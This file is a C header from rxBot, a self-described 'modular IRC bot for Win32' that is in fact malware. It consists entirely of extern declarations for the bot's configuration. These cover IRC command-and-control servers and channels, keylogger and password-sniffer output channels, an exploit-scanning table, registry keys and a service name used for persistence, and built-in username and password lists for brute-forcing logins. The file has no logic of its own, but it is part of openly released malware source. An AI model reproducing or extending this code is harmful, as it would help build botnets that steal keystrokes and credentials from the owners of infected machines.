/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// config extern globals for module use
extern char botid[];
extern char version[];
extern char password[];
extern char server[];
extern unsigned short port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern unsigned short port2;
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char keylogfile[];
extern char valuename[];
extern char nickconst[]; 
extern char modeonconn[];
extern char chanmode[];
extern char exploitchan[];
extern char keylogchan[];
extern char psniffchan[];
extern char servicename[];
extern char servicedesc[];
extern char *authost[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];

extern unsigned short socks4port;
extern unsigned short tftpport;
extern unsigned short httpport;
extern unsigned short ftpport;
extern unsigned short rloginport;

extern BOOL topiccmd;
extern BOOL rndfilename;
extern BOOL AutoStart;

extern char prefix;

extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;

// global threads
extern THREAD threads[MAXTHREADS];

// url visit function
extern HANDLE ih;

// aliases
extern ALIAS aliases[MAXALIASES];
extern int anum;

// passwords
extern char *usernames[];
extern char *passwords[];

// advscan
extern EXPLOIT exploit[];

// array sizes
extern int authsize;
extern int versionsize;

// misc
extern DWORD started;
extern BOOL success;
extern int current_version;


#ifdef DEBUG_LOGGING
extern char logfile[];
#endif

#ifdef PLAIN_CRYPT
extern char key[];
#endif
